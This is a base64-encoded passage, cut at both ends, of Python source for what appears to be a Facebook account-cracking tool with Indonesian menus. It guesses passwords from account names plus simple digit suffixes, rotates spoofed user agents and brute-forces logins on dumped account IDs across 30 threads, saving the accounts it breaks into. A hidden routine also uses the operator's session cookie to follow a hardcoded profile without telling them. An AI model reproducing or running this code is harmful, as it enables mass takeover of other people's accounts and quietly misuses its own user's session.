lsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjAsZ3ppcChnZmUpIiwNCiAgICAgICAgIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICJOb2tpYVgyLTAwLzUuMCAoMDguMzUpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCAoSmF2YTsgVTsgZW4tdXM7IG5va2lheDItMDApIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVMpIEFwcGxlV2ViS2l0LzUzMi4yIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lUGx1cy80LjAuMjIyLjMgQ2hyb21lLzQuMC4yMjIuMyBTYWZhcmkvNTMyLjIiLA0KICAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsDQogICAgICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc5MzBGIEJ1aWxkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IE1IQS1MMjkgQnVpbGQvSFVBV0VJTUhBLUwyOTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxMF8zXzIgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjAzLjIuNCAoS0hUTUwsIGxpa2UgR2Vja28pIE1vYmlsZS8xNEY4OSBbRkJBTi9GQklPUztGQkFWLzk2LjAuMC40NS43MDtGQkJWLzYwNTQ4NTQ1O0ZCRFYvaVBob25lNywyO0ZCTUQvaVBob25lO0ZCU04vaU9TO0ZCU1YvMTAuMy4yO0ZCU1MvMjtGQkNSL0UtUGx1cztGQklEL3Bob25lO0ZCTEMvZGVfREU7RkJPUC81O0ZCUlYvMF0iLA0KICAgICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IEc3LUwwMSBCdWlsZC9IdWF3ZWlHNy1MMDEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zMy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL01FU1NFTkdFUjtGQkFWLzEyMS4wLjAuMTUuNzA7XSIsDQogICAgICAgIkRhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IFNNLUozMjBGIEJ1aWxkL0xNWTQ3VikgW0ZCQU4vRkI0QTtGQkFWLzQzLjAuMC4yOS4xNDc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCTEMvZW5fR0I7RkJCVi8xNDI3NDE2MTtGQkNSL1RlbGUyIExUO0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJEVi9TTS1KMzIwRjtGQlNWLzUuMDtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTkyMH07RkJfRlcvMTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSZWRtaSBOb3RlIDkgUHJvIEJ1aWxkL1FLUTEuMTkxMjE1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85MS4wLjQ0NzIuNzcgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzI1LjAuMC4zNi4xNzA7XSIsDQogICAgICAgIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSJdDQoJcmFuZF91YSA9IHJhbmRvbS5jaG9pY2UodWdlbnQpDQoJcmV0dXJuIHJhbmRfdWENCiMgR0FOVEkgVVNFUiBBR0VOVA0KZGVmIHVzZXJhZ2VudCgpOg0KCXByaW50ICgiXG4lcyVzJXMgMDEgJXNHYW50aSB1c2VyIGFnZW50ICIlKFUsdGlsLFAsTykpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgdXNlciBhZ2VudCAiJShVLHRpbCxQLE8pKQ0KCXByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KCV9yb216XyA9IHJhd19pbnB1dCgnXG4lcyMlcyBQaWxpaCVzID4lcyAnJShQLE8sTSxLKSkNCgl1YXMoX3JvbXpfKQ0KZGVmIHVhcyhfcm9tel8pOg0KICAgIGlmIF9yb216XyA9PSAnJzoNCiAgICAgICAgcHJpbnQgJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCk7amVkYSgyKTt1YXMoX3JvbXpfKQ0KICAgIGVsaWYgX3JvbXpfIGluKCIxIiwiMDEiKToNCiAgICAJcHJpbnQgKCIlcyVzJXMgS2V0aWsgJXNNeSB1c2VyIGFnZW50JXMgZGkgYnJvd3NlciBnb29nbGUgY2hyb21lXG4lcyVzJXMgdW50dWsgZ3VuYWthbiB1c2VyIGFnZW50IGFuZGEgc2VuZGlyaSIlKFUsdGlsLE8sSCxPLFUsdGlsLE8pKQ0KICAgIAlwcmludCAoIiVzJXMlcyBLZXRpayAlc0NhbmNlbCVzIHVudHVrIGd1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gdG9vbHMiJShVLHRpbCxPLEgsTykpDQogICAgCXRyeToNCiAgICAJICAgIHVhID0gcmF3X2lucHV0KCIlcyVzJXMgRW50ZXIgdXNlciBhZ2VudCAlczogJXMiJShVLHRpbCxPLE0sSykpDQogICAgICAgICAgICBpZiB1YSBpbigiIik6DQogICAgICAgICAgICAJcHJpbnQgKCIlcyVzIGlzaSB5YW5nIGJlbmFyICIlKE0sdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgICAgIGVsaWYgdWEgaW4oIm15IHVzZXIgYWdlbnQiLCJNeSBVc2VyIEFnZW50IiwiTVkgVVNFUiBBR0VOVCIsIk15IHVzZXIgYWdlbnQiKToNCiAgICAgICAgICAgIAlqYWxhbigiJXMlcyVzIEFuZGEgYWthbiBkaSBhcmFoa2FuIGtlIGJyb3dzZXIgIiUoVSx0aWwsTykpO2plZGEoMikNCiAgICAgICAgICAgIAlvcy5zeXN0ZW0oImFtIHN0YXJ0IGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9TXkrdXNlcithZ2VudD4vZGV2L251bGwiKTtqZWRhKDIpO3VzZXJhZ2VudChfcm9tel8pDQogICAgICAgICAgICBlbGlmIHVhIGluKCJDQU5DRUwiLCJDYW5jZWwiLCJjYW5jZWwiKToNCiAgICAgICAgICAgIAl1YV8gPSAoIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIikNCiAgICAgICAgICAgICAgICBvcGVuKCJ1YS50eHQiLCJ3Iikud3JpdGUodWFfKTtqZWRhKDIpDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcbiVzJXMgbWVuZ2d1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gIiUoSCx0aWwpKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICAgICAgb3BlbigidWEudHh0IiwidyIpLndyaXRlKHVhKTtqZWRhKDIpDQogICAgICAgICAgICBwcmludCAoIlxuJXMlcyBiZXJoYXNpbCBtZW5nZ2FudGkgdXNlciBhZ2VudCIlKEgsdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KCQkJZXhpdCAoIlx4MWJbMTs5MW3igKIgRXJyb3IgIikgDQogICAgZWxpZiBfcm9tel8gaW4oIjIiLCIwMiIpOg0KICAgICAgICB0cnk6DQogICAgICAgIAl1YV8gPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKTtqZWRhKDIpO3ByaW50ICgiJXMlcyVzIHVzZXIgYWdlbnQgYW5kYSVzIDogJXMlcyIlKFUsdGlsLE8sTSxILHVhXykpO2plZGEoMik7cmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAJdWFfID0gJyVzLSclKE0pDQogICAgZWxpZiBfcm9tel8gaW4oIjAiLCIwMCIpOg0KICAgIAltZW51KCkNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAoJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCkpO2plZGEoMik7dWFzKF9yb216XykNCiMgU1RBUlQgQ1JBQ0sNCmRlZiBDb21iaW5hdGluKHRleHQpOg0KCWZvciB3IGluIHRleHQuc3BsaXQoIiAiKToNCgkJaWYgbGVuKHcpPDM6DQoJCQljb250aW51ZQ0KCQllbHNlOg0KCQkJdz13Lmxvd2VyKCkNCgkJCWlmIGxlbih3KT09MyBvciBsZW4odyk9PTQgb3IgbGVuKHcpPT01Og0KCQkJCXB3eCA9IFt3KycxMjMnLHcrJzEyMzQnLHcrJzEyMzQ1Jyx3LHRleHQubG93ZXIoKV0NCgkJCWVsc2U6DQoJCQkJcHd4ID0gW3crJzEyMycsdysnMTIzNCcsdysnMTIzNDUnLHddDQoJcmV0dXJuIHB3eA0KZGVmIGlrdXRpX2d3KGt1a2lzKToNCgl0cnk6DQoJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCQlrdWVoICA9IHsiY29va2llIjprdWtpc30NCgkJcj1wYXJzZXIoc2VzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLzEwMDA2NzgwNzU2NTg2MSIsY29va2llcz1rdWVoKS50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWZvciBpa3V0IGluIHIuZmluZF9hbGwoImEiKToNCgkJCWlmICJCZXJoZW50aSBtZW5naWt1dGkiIGluIHN0cihpa3V0KToNCgkJCQlicmVhaw0KCQkJZWxpZiAiSWt1dGkiIGluIHN0cihpa3V0KToNCgkJCQlzZXMuZ2V0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iK2lrdXRbImhyZWYiXSxjb29raWVzPWt1ZWgpDQoJZXhjZXB0OiBwYXNzDQpwd3ggPSBbXQ0KY2xhc3MgbmdlbnRvZDoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmKToNCiAgICAgICAgc2VsZi5pZCA9IFtdDQogICAgICAgIHNlbGYub3BzaV9jID0gW10NCiAgICAgICAgc2VsZi5nbSA9IFtdDQogICAgICAgIHNlbGYudWJhaF9wYXNzID0gW10NCiAgICAgICAgc2VsZi5wd2JhcnUgPSBbXQ0KICAgICAgICBzZWxmLnVnZW4gPSBbXQ0KICAgICAgICBzZWxmLnB3QmFydSA9IFtdDQogICAgICAgIHNlbGYudXJsID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSINCiAgICANCiAgICBkZWYgdWJhaHB3KHNlbGYpOg0KCQlwdz1yYXdfaW5wdXQoIiVzJXMlcyB1YmFoIHNhbmRpIGFrdW4gb25lIHRhYj8geS90ICVzPiAlcyIlKFUsdGlsLE8sTSxLKSkNCgkJaWYgcHcgaW5bJyddOg0KCQkJcHJpbnQoIiVz4oCiIGlzaSB5ZyBiZW5hciBrZW50b2QgIiUoTSkpDQoJCWVsaWYgcHcgaW5bJ3knLCdZJ106DQoJCQlzZWxmLnViYWhfcGFzcy5hcHBlbmQoInViYWgiKQ0KCQkJcHcyPXJhd19pbnB1dCgiJXMlcyVzIG1hc3VrYW4gc2FuZGkgJXM+ICVzIiUoVSx0aWwsTyxNLEspKTtwcmludCcnDQoJCQlpZiBsZW4ocHcyKSA8PSA1Og0KCQkJCWV4aXQoIiVz4oCiIHNhbmRpIG1pbmltYWwgNiBrYXJha3RlciAiJShNKSkNCgkJCWVsc2U6DQoJCQkJc2VsZi5wd2JhcnUuYXBwZW5kKHB3MikNCgkJZWxzZToNCgkJCXBhc3MNCiAgICANCiAgICBkZWYgb3BzaV9jcihzZWxmKToNCiAgICAJamFsYW4gKCJcbiVz4oCiICVzbXVuY3Vsa2FuIG9wc2kgY2hlY2twb2ludCByYXdhbiBzcGFtIGhhbCB5YW5nIHdhamFyIGppa2EgaGFzaWwgbnlhIHNlZGlraXQiJShVLE8pKQ0KICAgIAlvcCA9IHJhd19pbnB1dCgnXG4lc+KAoiVzIGd1bmFrYW4gb3BzaSBjaGVja3BvaW50PyB5L3QlcyA+ICVzJyUoVSxPLE0sSykpDQogICAgICAgIGlmIG9wID09Jyc6DQogICAgICAgIAlwcmludCgiJXPigKIgSXNpIHlhbmcgYmVuYXIga2VudG9kICIlKE0pKTtzZWxmLm9wc2lfY3IoKQ0KICAgICAgICBlbGlmIG9wIGluWydZJywneSddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJtdW5jdWwiKQ0KICAgICAgICAJc2VsZi51YmFocHcoKQ0KICAgICAgICBlbGlmIG9wIGluWyd0JywnVCddOg0KICAgICAgICAJc2VsZi5vcHNpX2MuYXBwZW5kKCJna19tdW5jdWwiKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgdWFfcmFuKHNlbGYpOg0KICAgIAlvcCA9IHJhd19pbnB1dCgnJXPigKIlcyBpbmdpbiBndW5ha2FuIHVhIHJhbmRvbT8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiBvcCA9PScnOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICAgICAgZWxpZiBvcCBpblsnWScsJ3knXToNCiAgICAgICAgCXNlbGYudWdlbi5hcHBlbmQoInJhbmRvbSIpDQogICAgICAgIGVsaWYgb3AgaW5bJ3QnLCdUJ106DQogICAgICAgIAlzZWxmLnVnZW4uYXBwZW5kKCJna19yYW5kb20iKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQoIiVz4oCiIElzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7c2VsZi5vcHNpX2NyKCkNCiAgICANCiAgICBkZWYgcm9taXkoc2VsZik6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGphbGFuICgiXG4lc+KAoiAlc3NlYmVsdW0gY3JhY2sgYW5kYSB3YWppYiBkdW1wIGlkIHRlcmxlYmloIGRhaHVsdSBwaWxpaCBhbnRhcmEgbWVudSAlczEtNiIlKFUsTyxQKSkNCiAgICAgICAgICAgIHNlbGYuYXBrID0gcmF3X2lucHV0KCdcbiVz4oCiJXMgZmlsZSBkdW1wICVzPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICAgICAgc2VsZi5pZCA9IG9wZW4oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIlcyBqdW1sYWggSWQlcyA+ICVzJXMnICUoVSxPLE0sSCxsZW4oc2VsZi5pZCkpKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgRmlsZSBkdW1wIHRpZGFrIGFkYSwgZHVtcCBpZCBkdWx1IGtlbnRvZCclKE0pKQ0KICAgICAgICAgICAgcmF3X2lucHV0KCdcbiVz4oCiICVzWyAlc2VudGVyICVzXSAnJShVLE8sVSxPKSk7bWVudSgpDQogICAgICAgIHNlbGYub3BzaV9jcigpDQogICAgICAgIHNlbGYudWFfcmFuKCkNCiAgICAgICAgdW5pa2VycyA9IHJhd19pbnB1dCgnJXPigKIlcyBndW5ha2FuIHBhc3N3b3JkIG1hbnVhbD8geS90JXMgPiAlcyclKFUsTyxNLEspKQ0KICAgICAgICBpZiB1bmlrZXJzIGluICgnWScsICd5Jyk6DQogICAgICAgICAgICBwcmludCAoJ1xuJXPigKIlcyBjb250b2glcyA+JXMgc2F5YW5nJXMsJXNwZW5nZW4lcywlc25nZW50b3QnJShVLE8sTSxPLE0sTyxNLE8pKQ0KICAgICAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgICAgICBwd3ggPSByYXdfaW5wdXQoJyVz4oCiJXMgcGFzc3dvcmQgJXM+ICVzJyUoVSxPLE0sSykpDQogICAgICAgICAgICAgICAgaWYgcHd4ID09ICcnOg0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgamFuZ2FuIGtvc29uZyAnJShNKSkNCiAgICAgICAgICAgICAgICBlbGlmIGxlbihwd3gpPD01Og0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIgcGFzc3dvcmQgbWluaW1hbCA2IGthcmFrdGVyJyUoTSkpO2V4aXQoKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGRlZiBtYW51YWwoYnJ1dGU9Tm9uZSk6DQogICAgICAgICAgICAgICAgICAgICAgICBpbmQgPSByYXdfaW5wdXQoJ1xuJXMjJXMgUGlsaWggJXM+JXMgJyUoUCxPLE0sSykpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpbmQgPT0gJyc6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCAiJShNKSk7bWFudWFsKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgaW5kIGluICgnMScsICcwMScpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnXG4lcyVzJXMgYWt1biAlc1tPS10gJXN0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNPSy8lcy50eHQnJShVLHRpbCxPLEgsTyxNLEgsd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVzJXMlcyBha3VuICVzWyVzQ1Alc10lcyB0ZXJzaW1wYW4ga2UgZmlsZSAlcz4gJXNDUC8lcy50eHQnJShVLHRpbCxPLE0sSyxNLE8sTSxLLHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgamFsYW4gKCdcbiVzISVzIG1haW5rYW4gbW9kZSBwZXNhd2F0IDIgZGV0aWsgamlrYSBsYW1hIGhhc2lsIFxuJyUoVSxPKSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGxvZzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFrdW4gaW4gc2VsZi5pZDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfaGVja18gPSBha3VuLnNwbGl0KCc8PT4nKVswXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZy5zdWJtaXQoc2VsZi5iX2FwaSwgX2hlY2tfLCBicnV0ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGl0KCIlc+KAoiBmaW5pc2hlZCIlKEgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBpbmQgaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVzJXMlcyBha3VuICVzW09LXSAlc3RlcnNpbXBhbiBrZSBmaWxlICVzPiAlc09LLyVzLnR4dCclKFUsdGlsLE8sSCxPLE0sSCx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICgnJXMlcyVzIGFrdW4gJXNbJXNDUCVzXSVzIHRlcnNpbXBhbiBrZSBmaWxlICVzPiAlc0NQLyVzLnR4dCclKFUsdGlsLE8sTSxLLE0sTyxNLEssd2FrdHUpKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBqYWxhbiAoJ1xuJXMhJXMgbWFpbmthbiBtb2RlIHBlc2F3YXQgMiBkZXRpayBqaWthIGxhbWEgaGFzaWwgXG4nJShVLE8pKTtqZWRhKDAuMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgbG9nOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYWt1biBpbiBzZWxmLmlkOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9oZWNrXyA9IGFrdW4uc3BsaXQoJzw9PicpWzBdDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nLnN1Ym1pdChzZWxmLmJhc2ljLCBfaGVja18sIGJydXRlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MucmVtb3ZlKHNlbGYuYXBrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4aXQoIiVz4oCiIGZpbmlzaGVkIiUoSCkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGluZCBpbiAoJzMnLCAnMDMnKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXMlcyVzIGFrdW4gJXNbT0tdICVzdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzT0svJXMudHh0JyUoVSx0aWwsTyxILE8sTSxILHdha3R1KSk7amVkYSgwLjIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclcyVzJXMgYWt1biAlc1slc0NQJXNdJXMgdGVyc2ltcGFuIGtlIGZpbGUgJXM+ICVzQ1AvJXMudHh0JyUoVSx0aWwsTyxNLEssTSxPLE0sSyx3YWt0dSkpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGphbGFuICgnXG4lcyElcyBtYWlua2FuIG1vZGUgcGVzYXdhdCAyIGRldGlrIGppa2EgbGFtYSBoYXNpbCBcbiclKFUsTykpO2plZGEoMC4yKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBsb2c6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBha3VuIGluIHNlbGYuaWQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX2hlY2tfID0gYWt1bi5zcGxpdCgnPD0+JylbMF0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2cuc3VibWl0KHNlbGYubW9iaWwsIF9oZWNrXywgYnJ1dGUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoc2VsZi5hcGspDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdCgiJXPigKIgZmluaXNoZWQiJShIKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCclKE0pKTttYW51YWwoKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJ1xuJXPigKIlcyBbICVzcGlsaWggbWV0aG9kZSBsb2dpbiwgc2lsYWhrYW4gY29iYSBzYXR1wrIgJXNdXG4nJShVLE8sVSxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAxJXMgbWV0aG9kZSAlc2ItYXBpICVzKGNlcGF0KSAnJShVLFAsTyxNLE8pKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDIlcyBtZXRob2RlICVzbWJhc2ljICVzKGxhbWJhdCkgJyUoVSxQLE8sUCxPKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgKCclc+KAoiAlczAzJXMgbWV0aG9kZSAlc21vYmlsZSAlcyhsYW1iYXQpICVzUHJvJyUoVSxQLE8sSCxPLEgpKQ0KICAgICAgICAgICAgICAgICAgICBtYW51YWwocHd4LnNwbGl0KCcsJykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGVsaWYgdW5pa2VycyBpbiAoJ1QnLCAndCcpOg0KICAgICAgICAgICAgcHJpbnQgKCdcbiVz4oCiJXMgWyAlc3BpbGloIG1ldGhvZGUgbG9naW4sIHNpbGFoa2FuIGNvYmEgc2F0dcKyJXMgXVxuJyUoVSxPLFUsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDElcyBtZXRob2RlICVzYi1hcGkgJXMoY2VwYXQpJyUoVSxQLE8sTSxPKSkNCiAgICAgICAgICAgIHByaW50ICgnJXPigKIgJXMwMiVzIG1ldGhvZGUgJXNtYmFzaWMgJXMobGFtYmF0KSclKFUsUCxPLFAsTykpDQogICAgICAgICAgICBwcmludCAoJyVz4oCiICVzMDMlcyBtZXRob2RlICVzbW9iaWxlICVzKGxhbWJhdCkgJXNQcm8nJShVLFAsTyxILE8sSCkpDQogICAgICAgICAgICBzZWxmLmxhbmdzdW5nKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCIlc+KAoiBJc2kgeWFuZyBiZW5hciBrZW50b2QgIiUoTSkpO2plZGEoMik7bWVudSgpDQogICAgIyBMQU5HU1VORw0KICAgIGRlZiBsYW5nc3VuZyhz